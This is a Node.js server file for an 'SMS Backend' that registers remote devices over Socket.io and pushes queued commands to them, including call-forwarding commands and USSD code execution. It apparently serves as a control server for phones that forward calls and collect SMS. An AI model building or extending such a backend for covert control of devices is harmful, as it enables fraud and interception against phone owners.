import express from 'express';
import dotenv from 'dotenv';
import cors from 'cors';
import { connectDB } from './database/db.js';
import http from "http"
import { Server } from 'socket.io';
import { normalizeDeviceId } from './helpers/deviceId.js';
import Command from './models/CommandModel.js';

// Load environment variables
dotenv.config({
  path: "./database/.env",
});

const app = express();
const server = http.createServer(app);
const io = new Server(server, {
  cors: {
    origin: '*',
    methods: ["GET", "POST"]
  },
  transports: ['websocket', 'polling']
});

const PORT = process.env.PORT || 4000; // Ensure PORT has a default value
const MONGODB = process.env.MONGO_URL;


// Validate required environment variables
if (!MONGODB) {
  console.error('ERROR: MONGO_URL environment variable is required');
  process.exit(1);
}

// Connect to MongoDB with error handling
connectDB(MONGODB)



// Middleware Setup
app.use(cors({
  origin: process.env.CORS_ORIGIN || '*',
  credentials: true
}));

app.use(express.json({
  limit: '10mb', // Increase limit for SMS data
  verify: (req, res, buf) => {
    // Add request size logging for debugging
    req.rawSize = buf.length;
  }
}));

app.use(express.urlencoded({
  extended: true,
  limit: '10mb'
}));

// Request logging middleware
app.use((req, res, next) => {
  const start = Date.now();
  const originalSend = res.send;

  res.send = function (data) {
    const duration = Date.now() - start;
    console.log(`${new Date().toISOString()} - ${req.method} ${req.path} - ${res.statusCode} - ${duration}ms - Size: ${req.rawSize || 0}bytes`);
    originalSend.call(res, data);
  };

  next();
});

// Health check route (before other routes)
app.get("/", (req, res) => {
  res.json({
    success: true,
    message: "SMS Backend API is running!",
    version: "2.0.0",
    timestamp: new Date().toISOString(),
    uptime: process.uptime()
  });
});




// Import Routes
import adminRoutes from './routes/AdminRoute.js';
import userRoutes from './routes/UserRoute.js';
import commandRoutes from './routes/CommandRoutes.js';
import orderRoutes from './routes/OrderRoute.js';





// Use Routes
app.use('/api', adminRoutes);
app.use('/api', userRoutes);
app.use('/api', commandRoutes);
app.use('/api', orderRoutes);



// Global error handler
app.use((error, req, res, next) => {
  console.error('Global error handler:', {
    error: error.message,
    stack: error.stack,
    path: req.path,
    method: req.method,
    body: req.body
  });

  // Handle specific error types
  if (error.type === 'entity.too.large') {
    return res.status(413).json({
      error: 'Request too large',
      message: 'The request payload is too large'
    });
  }

  if (error.name === 'SyntaxError' && error.message.includes('JSON')) {
    return res.status(400).json({
      error: 'Invalid JSON',
      message: 'Request body contains invalid JSON'
    });
  }

  res.status(error.status || 500).json({
    error: 'Internal server error',
    message: process.env.NODE_ENV === 'development' ? error.message : 'Something went wrong',
    timestamp: new Date().toISOString()
  });
});

// Socket.io connection handling with improved error handling
// Enhanced Socket.io connection handling with detailed logging
io.on('connection', (socket) => {
  console.log(`📱 Device connected: ${socket.id} at ${new Date().toISOString()}`);

  // Get deviceId from query if available
  const queryDeviceId = socket.handshake.query?.deviceId;
  if (queryDeviceId) {
    console.log(`🔍 Device ID from query: ${queryDeviceId}`);
    const normalizedId = normalizeDeviceId(queryDeviceId);
    socket.data.deviceId = normalizedId;
    socket.join(normalizedId);
    console.log(`🏠 Auto-joined room: ${normalizedId} (Socket: ${socket.id})`);
  }

  socket.on('register-device', async (rawId) => {
    const deviceId = normalizeDeviceId(rawId);

    if (!deviceId) {
      console.warn(`❌ Invalid deviceId registration attempt: ${rawId}`);
      socket.emit('error', { message: 'Invalid device ID' });
      return;
    }

    console.log(`📝 Processing device registration: ${deviceId}`);

    // Leave all previous rooms except socket.id
    const currentRooms = Array.from(socket.rooms);
    console.log(`📋 Current rooms before cleanup: ${currentRooms.join(', ')}`);

    currentRooms.forEach(room => {
      if (room !== socket.id) {
        socket.leave(room);
        console.log(`🚪 Left room: ${room}`);
      }
    });

    // Join device-specific room
    socket.join(deviceId);
    socket.data.deviceId = deviceId;

    console.log(`✅ Device registered successfully!`);
    console.log(`   Device ID: ${deviceId}`);
    console.log(`   Socket ID: ${socket.id}`);
    console.log(`   Joined room: ${deviceId}`);
    console.log(`   Current rooms: ${Array.from(socket.rooms).join(', ')}`);

    // Confirm registration with comprehensive data
    const registrationData = {
      deviceId,
      timestamp: new Date().toISOString(),
      socketId: socket.id,
      rooms: Array.from(socket.rooms),
      success: true,
      message: `Successfully registered device ${deviceId}`
    };

    socket.emit('registered', registrationData);
    console.log(`📤 Registration confirmation sent:`, registrationData);

    // Send any pending commands immediately after registration
    try {
      const pendingCommands = await Command.find({ deviceId, done: false })
        .sort({ createdAt: -1 })
        .limit(20);

      if (pendingCommands.length > 0) {
        console.log(`📋 Found ${pendingCommands.length} pending commands for ${deviceId}`);

        // Send pending commands with staggered delivery
        pendingCommands.forEach((cmd, index) => {
          setTimeout(() => {
            console.log(`📤 Sending pending command ${index + 1}/${pendingCommands.length}: ${cmd.action}`);
            console.log(`   Command ID: ${cmd._id}`);
            console.log(`   Payload:`, cmd.payload);

            socket.emit('command', { ...cmd.toObject(), urgent: true, pending: true });
            socket.emit('call-forward-command', { ...cmd.toObject(), urgent: true, pending: true });
          }, index * 2000); // 2 second delay between commands
        });
      } else {
        console.log(`📋 No pending commands found for ${deviceId}`);
      }
    } catch (err) {
      console.error('❌ Error fetching pending commands:', err);
    }

    // Verify room membership after 3 seconds
    setTimeout(async () => {
      try {
        const socketsInRoom = await io.in(deviceId).fetchSockets();
        console.log(`🔍 ROOM VERIFICATION FOR ${deviceId}:`);
        console.log(`   Sockets in room: ${socketsInRoom.length}`);

        if (socketsInRoom.length > 0) {
          socketsInRoom.forEach((s, i) => {
            console.log(`   Socket ${i + 1}: ${s.id} ${s.id === socket.id ? '(THIS SOCKET)' : ''}`);
          });
          console.log(`✅ Room verification SUCCESS - ${socketsInRoom.length} socket(s) in room ${deviceId}`);
        } else {
          console.error(`❌ ROOM VERIFICATION FAILED - NO SOCKETS in room ${deviceId}`);
        }
      } catch (err) {
        console.error('❌ Error during room verification:', err);
      }
    }, 3000);
  });

  socket.on('disconnect', (reason) => {
    const deviceId = socket.data?.deviceId;
    console.log(`📱 Device disconnected: ${socket.id} (${deviceId}) - Reason: ${reason} at ${new Date().toISOString()}`);
  });

  socket.on('error', (error) => {
    console.error(`📱 Socket error for ${socket.id}:`, error);
  });

  // Handle ping/pong for connection health
  socket.on('ping', () => {
    socket.emit('pong', { timestamp: Date.now(), socketId: socket.id });
  });

  // Enhanced command acknowledgment handling
  socket.on('command-ack', async (data) => {
    try {
      const { commandId, success, error, deviceId, ussdCode, message } = data;
      console.log(`📝 COMMAND ACKNOWLEDGMENT RECEIVED:`);
      console.log(`   Command ID: ${commandId}`);
      console.log(`   Success: ${success}`);
      console.log(`   Device: ${deviceId}`);
      console.log(`   USSD Code: ${ussdCode || 'N/A'}`);
      console.log(`   Message: ${message || 'None'}`);
      console.log(`   Error: ${error || 'None'}`);

      if (commandId) {
        const updatedCommand = await Command.findByIdAndUpdate(commandId, {
          done: success,
          error: error || null,
          executedAt: new Date(),
          ussdCode: ussdCode || null,
          executionMessage: message || null,
          updatedAt: new Date()
        }, { new: true });

        if (updatedCommand) {
          console.log(`✅ Command ${commandId} updated successfully: ${success ? 'EXECUTED' : 'FAILED'}`);
        } else {
          console.warn(`⚠️ Command ${commandId} not found in database`);
        }
      }
    } catch (err) {
      console.error('❌ Error processing command acknowledgment:', err);
    }
  });

  // Keep connection alive with periodic ping
  const pingInterval = setInterval(() => {
    if (socket.connected) {
      socket.emit('ping');
    } else {
      clearInterval(pingInterval);
    }
  }, 30000);

  socket.on('disconnect', () => {
    clearInterval(pingInterval);
  });
});


// Make io globally available for controllers
global.io = io;

// Graceful shutdown handling
const gracefulShutdown = (signal) => {
  console.log(`\n📡 Received ${signal}. Starting graceful shutdown...`);

  server.close((error) => {
    if (error) {
      console.error('❌ Error during server shutdown:', error);
      process.exit(1);
    }

    console.log('✅ HTTP server closed');

    // Close database connections
    if (global.mongoose) {
      global.mongoose.connection.close((error) => {
        if (error) {
          console.error('❌ Error closing database connection:', error);
        } else {
          console.log('✅ Database connection closed');
        }
        process.exit(0);
      });
    } else {
      process.exit(0);
    }
  });

  // Force exit after 10 seconds
  setTimeout(() => {
    console.log('⏰ Force exiting after 10 seconds...');
    process.exit(1);
  }, 10000);
};

// Listen for termination signals
process.on('SIGTERM', () => gracefulShutdown('SIGTERM'));
process.on('SIGINT', () => gracefulShutdown('SIGINT'));

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
  console.error('❌ Uncaught Exception:', error);
  gracefulShutdown('uncaughtException');
});

// Handle unhandled promise rejections
process.on('unhandledRejection', (reason, promise) => {
  console.error('❌ Unhandled Rejection at:', promise, 'reason:', reason);
  gracefulShutdown('unhandledRejection');
});

// Start server
server.listen(PORT, () => {
  console.log(`🚀 SMS Backend Server is running on port ${PORT}`);
  console.log(`📱 Environment: ${process.env.NODE_ENV || 'development'}`);
  console.log(`🌐 Socket.io ready for device connections`);
  console.log(`⏰ Server started at: ${new Date().toISOString()}`);
});

export default app;